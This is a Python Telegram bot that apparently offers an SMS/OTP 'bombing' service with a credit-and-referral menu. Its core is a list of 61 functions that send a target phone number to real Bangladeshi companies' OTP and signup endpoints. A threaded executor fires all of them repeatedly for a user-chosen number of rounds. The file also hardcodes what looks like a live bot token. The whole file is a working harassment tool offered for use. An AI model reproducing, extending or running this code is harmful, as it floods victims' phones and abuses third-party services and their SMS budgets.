import telebot
import requests
import threading
import os
import json
import time
from concurrent.futures import ThreadPoolExecutor
from flask import Flask
from telebot import types

# ==========================================
# 🌐 WEB SERVER (Keep Alive)
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Supreme Bot is Online!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    threading.Thread(target=run_web_server, daemon=True).start()

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM' 
OWNER_ID = 6941003064              
CHANNEL_ID = "@SH_tricks"         
DATA_FILE = 'supreme_db.json'
ADSTERRA_URL = "https://www.effectivegatecpm.com/wnbk2zjv?key=75442aee9e8b64a0d71c17a99228474d"

bot = telebot.TeleBot(API_TOKEN)
pending_claims = {}

# ==========================================
# 🚀 ALL 67 APIs FUNCTIONS
# ==========================================
def api_1(t): requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={t}&lang=en&ng=0", timeout=5)
def api_2(t): requests.get(f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={t}", timeout=5)
def api_3(t): requests.post("https://training.gov.bd/backoffice/api/user/sendOtp", json={"phone": t}, timeout=5)
def api_4(t): requests.post("https://da-api.robi.com.bd/da-nll/otp/send", json={"msisdn": t}, timeout=5)
def api_5(t): requests.post("https://core.easy.com.bd/api/v1/registration", json={"mobile": t}, timeout=5)
def api_6(t): requests.post("https://prod.etestpaper.net/api/auth/signup", json={"phone": t}, timeout=5)
def api_7(t): requests.post("https://foodaholic.com.bd/api/v1/auth/sign-up", json={"phone": t}, timeout=5)
def api_8(t): requests.post("https://waltonplaza.com.bd/api/auth/otp/create", json={"phone": t}, timeout=5)
def api_9(t): requests.post("https://foodcollections.com/api/v1/auth/login", json={"phone": t}, timeout=5)
def api_10(t): requests.post("https://chokrojan.com/api/v1/passenger/login/mobile", json={"mobile_number": t}, timeout=5)
def api_11(t): requests.post("https://billing.proiojon.com/api/v1/auth/login", json={"phone": t}, timeout=5)
def api_12(t): requests.post("https://auth.qcoom.com/api/v1/otp/send", json={"mobileNumber": t}, timeout=5)
def api_13(t): requests.post("https://pbs.com.bd/login/?handler=UserGetOtp", data={"MobileNo": t}, timeout=5)
def api_14(t): requests.post("https://api.shikho.com/auth/v2/send/sms", json={"phone": t}, timeout=5)
def api_15(t): requests.post("https://api.doctime.com.bd/api/v2/authenticate", json={"contact_no": t}, timeout=5)
def api_16(t): requests.post("https://api.kabbik.com/v1/auth/otpnew", json={"msisdn": t}, timeout=5)
def api_17(t): requests.post("https://mbonlineapi.com/api/front/send/otp", json={"CellPhone": t}, timeout=5)
def api_18(t): requests.post("https://offers.sindabad.com/api/mobile-otp", json={"mobile": t}, timeout=5)
def api_19(t): requests.post("https://eshop-api.banglalink.net/api/v1/customer/send-otp", json={"phone": t}, timeout=5)
def api_20(t): requests.post("https://www.lazzpharma.com/MessagingArea/OtpMessage/WebRegister", json={"Phone": t}, timeout=5)
def api_21(t): requests.post("https://developer.medha.info/api/send-otp", json={"phone": t}, timeout=5)
def api_22(t): requests.post("https://webloginda.robi.com.bd/backend/api/v1/otp", json={"phone_number": t}, timeout=5)
def api_23(t): requests.post("https://edge.ali2bd.com/api/consumer/v1/auth/login", json={"username": t}, timeout=5)
def api_24(t): requests.post("https://api.chardike.com/api/otp/send", json={"phone": t}, timeout=5)
def api_25(t): requests.post("https://api.englishmojabd.com/api/v1/auth/login", json={"phone": t}, timeout=5)
def api_26(t): requests.post("https://api.gorillamove.com/api/v1/core/account/phone_login", json={"phone_number": t}, timeout=5)
def api_27(t): requests.post("https://manambd.com/_public/api/send/otp", json={"mobile_no": t}, timeout=5)
def api_28(t): requests.post("https://www.shwapno.com/api/auth", json={"phoneNumber": t}, timeout=5)
def api_29(t): requests.post("https://api.ghoorilearning.com/api/auth/signup/otp", json={"mobile_no": t}, timeout=5)
def api_30(t): requests.post("https://moveonbd.com/api/v1/customer/auth/phone/request-otp", json={"phone": t}, timeout=5)
def api_31(t): requests.post("https://api.swap.com.bd/api/v1/send-otp/v2", json={"phone": t}, timeout=5)
def api_32(t): requests.post("https://api.arogga.com/auth/v1/sms/send/", data={"mobile": t}, timeout=5)
def api_33(t): requests.get(f"https://web-api.binge.buzz/api/v3/otp/send/{t}", timeout=5)
def api_34(t): requests.post("https://www.khaasfood.com/wp-admin/admin-ajax.php", data={"mobileNo": t}, timeout=5)
def api_35(t): requests.post(f"https://www.rokomari.com/otp/send?emailOrPhone={t}&countryCode=BD", timeout=5)
def api_36(t): requests.get(f"https://api.medeasy.health/api/send-otp/{t}/", timeout=5)
def api_37(t): requests.post("https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", json={"phone": t}, timeout=5)
def api_38(t): requests.post("https://admin.beautybooth.com.bd/api/v2/auth/register", json={"value": t, "type": "phone"}, timeout=5)
def api_39(t): requests.post("https://backend.sailor.clothing/api/v2/auth/signup", json={"phone": t, "password": "Password123@"}, timeout=5)
def api_40(t): requests.post("https://api.binge.buzz/api/v4/auth/otp/send", json={"phone": f"+88{t}"}, timeout=5)
def api_41(t): requests.post("https://kfcbd.com/livewire/message/home.login", json={"updates": [{"type":"syncInput","payload":{"name":"mobile","value": t}}]}, timeout=5)
def api_42(t): requests.post("https://api.bdtickets.com/v1/auth", json={"phoneNumber": f"+88{t}"}, timeout=5)
def api_43(t): requests.post("https://api.apex4u.com/api/auth/login", json={"phoneNumber": t}, timeout=5)
def api_44(t): requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={t}", timeout=5)
def api_45(t): requests.post("https://web-api.banglalink.net/api/v1/user/otp-login/request", json={"mobile": t}, timeout=5)
def api_46(t): requests.post("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{t}"}, timeout=5)
def api_47(t): requests.post("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", json={"phoneNumber": f"+88{t}"}, timeout=5)
def api_48(t): requests.post("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{t}"}, timeout=5)
def api_49(t): requests.post("https://bb-api.bohubrihi.com/public/activity/otp", json={"phone": t}, timeout=5)
def api_50(t): requests.get(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={t}", timeout=5)
def api_51(t): requests.post("https://api.osudpotro.com/api/v1/users/send_otp", json={"mobile": f"+88-{t}"}, timeout=5)
def api_52(t): requests.post("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", json={"phone_number": t}, timeout=5)
def api_53(t): requests.post(f"https://app.hishabee.business/api/V2/otp/send?mobile_number={t}", timeout=5)
def api_54(t): requests.post("https://backend-api.shomvob.co/api/v2/otp/phone", json={"phone": f"88{t}"}, timeout=5)
def api_55(t): requests.post("https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{t}"}, timeout=5)
def api_56(t): requests.post("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", json={"phoneNumber": t}, timeout=5)
def api_57(t): requests.post("https://cokestudio23.sslwireless.com/api/store-and-send-otp", json={"msisdn": "880" + t[-10:]}, timeout=5)
def api_58(t): requests.post("https://api.swap.com.bd/api/v1/send-otp", json={"phone": "0" + t[-10:]}, timeout=5)
def api_59(t): requests.post("https://prod-api.viewlift.com/identity/signup?site=prothomalo", json={"phoneNumber": "+880" + t[-10:]}, timeout=5)
def api_60(t): requests.post("https://www.bd.airtel.com/en", data=f'msisdn={t}', timeout=5)
def api_61(t): requests.post("https://www.robi.com.bd/bn", data=f'msisdn={t}', timeout=5)

all_apis = [api_1, api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_10, api_11, api_12, api_13, api_14, api_15, api_16, api_17, api_18, api_19, api_20, api_21, api_22, api_23, api_24, api_25, api_26, api_27, api_28, api_29, api_30, api_31, api_32, api_33, api_34, api_35, api_36, api_37, api_38, api_39, api_40, api_41, api_42, api_43, api_44, api_45, api_46, api_47, api_48, api_49, api_50, api_51, api_52, api_53, api_54, api_55, api_56, api_57, api_58, api_59, api_60, api_61]

# ==========================================
# ⚙️ LOGIC & DATABASE
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE): return {"users": {}}
    with open(DATA_FILE, 'r') as f: return json.load(f)

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

def attack_executor(target, rounds):
    with ThreadPoolExecutor(max_workers=70) as executor:
        for _ in range(rounds):
            for api in all_apis:
                try: executor.submit(api, target)
                except: pass
            time.sleep(1)

# ==========================================
# 🤖 BOT HANDLERS
# ==========================================
def is_joined(uid):
    if uid == OWNER_ID: return True
    try:
        status = bot.get_chat_member(CHANNEL_ID, uid).status
        return status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    if uid not in db['users']:
        db['users'][uid] = {"credits": 5, "ref": 0}
        save_data(db)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🚀 Start Bomb", "👤 Profile", "💎 Get Credits", "👥 Refer & Earn")
    bot.send_message(message.chat.id, "🔥 **SH TRICKS SUPREME** 🔥\nসব API অ্যাড করা হয়েছে!", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def menu(message):
    uid = str(message.from_user.id)
    if not is_joined(message.from_user.id):
        btn = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("Join Channel", url=f"https://t.me/SH_tricks"))
        return bot.reply_to(message, "❌ জয়েন না করলে কাজ করবে না!", reply_markup=btn)

    if message.text == "🚀 Start Bomb":
        if db['users'][uid]['credits'] < 1: return bot.reply_to(message, "ব্যালেন্স নেই!")
        msg = bot.reply_to(message, "নাম্বার দিন (১১ ডিজিট):")
        bot.register_next_step_handler(msg, ask_rounds)
    
    elif message.text == "👤 Profile":
        u = db['users'][uid]
        bot.reply_to(message, f"💰 Credits: {u['credits']}\n👥 Refers: {u['ref']}")

def ask_rounds(message):
    target = message.text
    msg = bot.reply_to(message, "কত রাউন্ড?")
    bot.register_next_step_handler(msg, start_bomb, target)

def start_bomb(message, target):
    try:
        rounds = int(message.text)
        bot.reply_to(message, f"🚀 {target} এ বোম্বিং শুরু হয়েছে!")
        threading.Thread(target=attack_executor, args=(target, rounds)).start()
    except: bot.reply_to(message, "ভুল ইনপুট!")

if __name__ == "__main__":
    keep_alive()
    bot.remove_webhook()
    print("Bot is Started...")
    bot.polling(non_stop=True)
